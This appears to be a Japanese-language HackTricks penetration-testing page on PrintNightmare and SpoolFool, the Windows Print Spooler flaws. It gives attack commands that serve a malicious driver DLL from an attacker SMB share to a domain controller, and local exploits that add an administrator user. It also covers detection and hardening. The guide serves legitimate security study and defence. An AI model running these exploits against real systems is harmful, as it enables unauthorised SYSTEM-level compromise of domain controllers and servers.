# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare は、Windows の **Print Spooler** サービスに存在する一連の脆弱性の総称であり、**SYSTEM としての任意コード実行**を可能にします。また、spooler に RPC 経由で到達できる場合、**ドメインコントローラーやファイルサーバー上でのリモートコード実行 (RCE)** も可能です。最も広く悪用された CVE は **CVE-2021-1675** (当初は LPE と分類) と **CVE-2021-34527** (完全な RCE) です。その後の **CVE-2021-34481 (“Point & Print”)** や **CVE-2022-21999 (“SpoolFool”)** などの問題は、攻撃対象領域が依然として完全には閉じられていないことを示しています。

**driver-based RCE/LPE** ではなく、spooler 経由の **authentication coercion / relay** を探している場合は、[printer coercion abuse に関するこちらのページ](printers-spooler-service-abuse.md)を確認してください。このページでは、**driver / DLL を SYSTEM として読み込むこと**に焦点を当てています。

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021 年 6 月の CU で修正されたが、CVE-2021-34527 によって bypass された|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` により、認証済みユーザーが remote share から driver DLL を読み込める。2021 年 8 月以降は通常、弱体化された Point & Print policies が必要|
|2021|CVE-2021-34481|“Point & Print”|LPE|non-admin users による unsigned driver のインストール|
|2022|CVE-2022-21999|“SpoolFool”|LPE|任意の directory creation → DLL planting – 2021 年の patches 適用後も動作|

これらはすべて、**MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) のいずれか、または **Point & Print** 内部の trust relationships を悪用します。

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

認証済みだが **non-privileged** な domain user は、以下の方法で remote spooler (多くの場合 DC) 上で **NT AUTHORITY\SYSTEM** として任意の DLL を実行できます。
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
代表的な PoCs には、**CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#）、および **mimikatz** の Benjamin Delpy による `misc::printnightmare / lsa::addsid` モジュールがあります。

### 2.2 ローカル privilege escalation（サポート対象の Windows、2021-2024）

同じ API を**ローカル**で呼び出し、`C:\Windows\System32\spool\drivers\x64\3\` から driver をロードして SYSTEM 権限を取得できます。
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 パッチ適用済みホストでの最新のtriage

完全に更新されたホストでは、Windowsが現在、プリンタードライバーのインストールを**管理者のみに制限**しているため（2021年8月10日以降、`RestrictDriverInstallationToAdministrators=1`）、公開されているPrintNightmareのPoCは失敗することがよくあります。ターゲットにexploitを実行する前に、まず環境でレガシーなプリンター展開のためにこの安全対策が元に戻されていないか確認してください:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
通常、最も注目すべき脆弱な値は次のとおりです。<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoC を実行する前に、Linux から対象が関連する print RPC interfaces を公開していることをすばやく確認します。
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
最近の公開ツールの中には、DLLを送信する前に、より安全な **check/list** ワークフローを利用できるものもあります。
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> 低権限ユーザーとして `RPC_E_ACCESS_DENIED` (`0x8001011b`) が発生する場合、通常はトランスポート障害ではなく、2021年以降のデフォルト設定に遭遇しています。

> Windows 11 22H2以降および新しいクライアントビルドでは、リモート印刷はデフォルトで **RPC over TCP** を使用し、**RPC over named pipes** (`\PIPE\spoolss`) は明示的に再有効化しない限り無効です。古いPoCやラボのメモでは、依然としてnamed pipeに到達できることを前提としている場合があります。<sup>[[4]](#references)</sup>

### 2.4 「patched」ネットワークにおける Package Point & Print abuse

多くのエンタープライズ環境では、ヘルプデスクやprint serverのワークフローで、管理者以外のユーザーによるdriverのインストールや更新が依然として必要だったため、2021年の最初のpatch適用後もポリシー上 **vulnerable** な状態が続きました。実際の攻撃手順は次のようになります。

- セキュリティプロンプトが完全に無効化されている場合、**classic arbitrary-DLL PrintNightmare** が依然として最短経路です。
- `Only use Package Point and Print` が有効な場合、通常はraw DLLの配置ではなく、**signed package-aware driver** の経路へpivotする必要があります。<sup>[[3]](#references)</sup>
- 2024年のresearchでは、**`Package Point and Print - Approved servers` はそれ自体が強固なtrust boundaryではない**ことが示されました。攻撃者が承認済みprint serverの1台についてname resolutionをspoofまたはhijackできる場合、被害者をpolicy checksを満たすmalicious serverへリダイレクトできます。<sup>[[4]](#references)</sup>
- UNC hardeningとforced RPC-over-SMBを組み合わせても、modern clientsが **RPC over TCP** へfallbackする可能性があるため、不安定になることがあります。<sup>[[4]](#references)</sup>

このため、modern PrintNightmare-style exploitationでは、元の2021年のPoCを変更せずに再実行するよりも、**enterprise printer deployment policyをabuseすること**が重視される場合が多くなっています。

### 2.5 SpoolFool (CVE-2022-21999) – 2021年のfixをbypassする

Microsoftの2021年のpatchはremote driver loadingをブロックしましたが、**directory permissionsはhardeningされませんでした**。SpoolFoolは`SpoolDirectory`パラメータをabuseして、`C:\Windows\System32\spool\drivers\`配下にarbitrary directoryを作成し、payload DLLを配置して、spoolerにそれをloadさせます。<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> この exploit は、2022年2月の更新以前の、完全に patch 済みの Windows 7 → Windows 11 および Server 2012R2 → 2022 で動作します<sup>[[2]](#references)</sup>

---

## 3. Detection & hunting

* **PrintService logs** – *Microsoft-Windows-PrintService/Operational* channel を有効にし、成功および失敗した試行の両方で **Event ID 316**（driver の追加/更新。通常は DLL 名を含む）を監視します。これを **Event ID 808/811** と組み合わせて、疑わしい spooler module/driver の load failure を検出します。
* **Sysmon** – 親 process が **spoolsv.exe** である場合に、`C:\Windows\System32\spool\drivers\*` 内で発生する `Event ID 7`（Image loaded）または `11/23`（File write/delete）。
* **Process lineage** – **spoolsv.exe** が `cmd.exe`、`rundll32.exe`、PowerShell、または予期しない unsigned child process を spawn した場合は、常に alert を発生させます。
* **Network telemetry** – **spoolsv.exe** から attacker-controlled shares への予期しない SMB fetch、または print server として動作すべきではない server からの通常とは異なる printer RPC traffic は、いずれも signal の高い手がかりです。

## 4. Mitigation & hardening

1. **Patch!** – Print Spooler service がインストールされているすべての Windows host に、最新の cumulative update を適用します。
2. **不要な場所では spooler を disable する**。特に Domain Controller では次のようにします:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **ローカル printing を許可したまま remote connections を block する** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. 次の設定により **Point & Print を admin-only に維持する**:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
詳細な guidance は Microsoft KB5005652<sup>[[1]](#references)</sup>
5. 業務要件により `RestrictDriverInstallationToAdministrators=0` を強制的に使用する場合は、その他すべての printer policy を **partial mitigation に過ぎないもの** として扱います。最低限、**package-aware drivers** を優先し、**Only use Package Point and Print** を有効にし、**Package Point and Print - Approved servers** を明示的な in-forest print servers に限定します。<sup>[[3]](#references)</sup>
6. 壊れた printer mappings を修正するためだけに **printer RPC privacy を rollback しないでください**。`RpcAuthnLevelPrivacyEnabled=0` を設定している environment は、**CVE-2021-1678** 対策として追加された hardening を元に戻しており、通常 engagement 中に追加の scrutiny を受けるべきです。<sup>[[4]](#references)</sup>

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`、`-list`、`-delete` modes を備えた標準的な Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery、multi-target support、`MS-RPRN` / `MS-PAR` 両方の modes を備えた wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print を介した、bring-your-own-vulnerable-printer-driver abuse
* SpoolFool exploit & write-up
* SpoolFool およびその他の spooler bugs 向けの 0patch micropatches

driver を load する代わりに spooler を介して **coerce authentication** したい場合は、[printer spooler service abuse](printers-spooler-service-abuse.md) に進んでください。

---

## References

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
